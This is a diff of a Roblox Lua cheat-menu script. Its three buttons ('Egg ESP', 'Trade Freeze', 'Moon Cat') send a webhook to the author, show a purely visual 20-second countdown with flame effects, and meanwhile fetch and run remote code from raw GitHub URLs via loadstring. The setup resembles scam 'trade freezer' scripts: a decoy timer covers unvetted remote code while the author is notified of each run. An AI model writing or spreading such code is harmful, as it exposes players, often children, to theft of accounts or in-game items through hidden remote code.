@@ -99,26 +99,31 @@ messageLabel.Parent = countdownFrame
 
 -- Partículas
 local particlesRunning = false
+
 local function createFlameParticle(parent, side)
 	local particle = Instance.new("Frame")
 	particle.Size = UDim2.new(0, 8, 0, 12)
 	particle.AnchorPoint = Vector2.new(0.5, 1)
 	local posX = (side == "left") and 0 or 1
 	particle.Position = UDim2.new(posX, 0, 1, 0)
+
 	particle.BackgroundColor3 = (math.random() > 0.5) and Color3.fromRGB(170, 0, 255) or Color3.fromRGB(255, 50, 50)
 	particle.BackgroundTransparency = 0.3
 	particle.BorderSizePixel = 0
 	particle.ZIndex = 5
 	particle.Parent = parent
+
 	local tweenInfo = TweenInfo.new(1.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
 	local tween = TweenService:Create(particle, tweenInfo, {
 		Position = UDim2.new(posX, 0, 0, -30),
 		Size = UDim2.new(0, 4, 0, 6),
 		BackgroundTransparency = 1
 	})
+
 	tween:Play()
 	tween.Completed:Connect(function() particle:Destroy() end)
 end
+
 local function startFlameEffect()
 	particlesRunning = true
 	task.spawn(function()
@@ -129,6 +134,7 @@ local function startFlameEffect()
 		end
 	end)
 end
+
 local function stopFlameEffect()
 	particlesRunning = false
 end
@@ -142,16 +148,20 @@ function sendWebhook(message)
 	if not success then warn("Webhook error:", err) end
 end
 
--- Mostrar cuenta regresiva
+-- Mostrar cuenta regresiva solo visual, sin bloquear ejecución
 local countdownActive = false
 local function showCountdown(message, warningText)
 	if countdownActive then return end
 	countdownActive = true
+
 	mainFrame.Visible = false
 	countdownFrame.Visible = true
 	messageLabel.Text = message
 	warningLabel.Text = warningText
+
 	startFlameEffect()
+
+	-- No bloquear con wait, solo actualizar texto con delay sin detener ejecución
 	spawn(function()
 		for i = 20, 0, -1 do
 			countdownLabel.Text = tostring(i) .. "s"
@@ -164,22 +174,30 @@ local function showCountdown(message, warningText)
 	end)
 end
 
--- Función de botón
-local function onButtonPressed(webhookMessage, countdownMsg, warningMsg)
+-- Función para ejecutar script loadstring y mostrar efectos
+local function onButtonPressed(webhookMessage, countdownMsg, warningMsg, scriptUrl)
 	sendWebhook(webhookMessage)
 	showCountdown(countdownMsg, warningMsg)
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/catmethod/Traderfreezer/refs/heads/main/Eggesp"))()
+	
+	if scriptUrl then
+		local success, err = pcall(function()
+			loadstring(game:HttpGet(scriptUrl, true))()
+		end)
+		if not success then
+			warn("Error ejecutando script: ".. tostring(err))
+		end
+	end
 end
 
--- Configurar botones
+-- Configuración de botones
 local buttons = {
-	{button = btn1, webhookMessage = "📦 Ejecutado: Egg ESP", countdownMsg = "Randomizing egg in 20 seconds", warning = "⚠️ Use again if egg fails ⚠️"},
-	{button = btn2, webhookMessage = "🚨 Ejecutado: Trade Freeze", countdownMsg = "Trade freezing in 20 seconds", warning = "⚠️ If trade freeze does not work, use the script again ⚠️"},
-	{button = btn3, webhookMessage = "🌙 Ejecutado: Moon Cat", countdownMsg = "Moon cat script in 20 seconds", warning = "⚠️ Use again if script fails ⚠️"}
+	{button = btn1, webhookMessage = "📦 Ejecutado: Egg ESP", countdownMsg = "Randomizing egg in 20 seconds", warning = "⚠️ Use again if egg fails ⚠️", script = "https://raw.githubusercontent.com/idkgimah/Eggrandomizer/refs/heads/main/Eggesp"},
+	{button = btn2, webhookMessage = "🚨 Ejecutado: Trade Freeze", countdownMsg = "Trade freezing in 20 seconds", warning = "⚠️ If trade freeze does not work, use the script again ⚠️", script = "https://raw.githubusercontent.com/catmethod/eggesp/refs/heads/main/Tradefreezer"},
+	{button = btn3, webhookMessage = "🌙 Ejecutado: Moon Cat", countdownMsg = "Moon cat script in 20 seconds", warning = "⚠️ Use again if script fails ⚠️", script = "https://raw.githubusercontent.com/catmethod/tradefreezer/refs/heads/main/mooncat"}
 }
 
 for _, data in ipairs(buttons) do
 	data.button.MouseButton1Click:Connect(function()
-		onButtonPressed(data.webhookMessage, data.countdownMsg, data.warning)
+		onButtonPressed(data.webhookMessage, data.countdownMsg, data.warning, data.script)
 	end)
 end
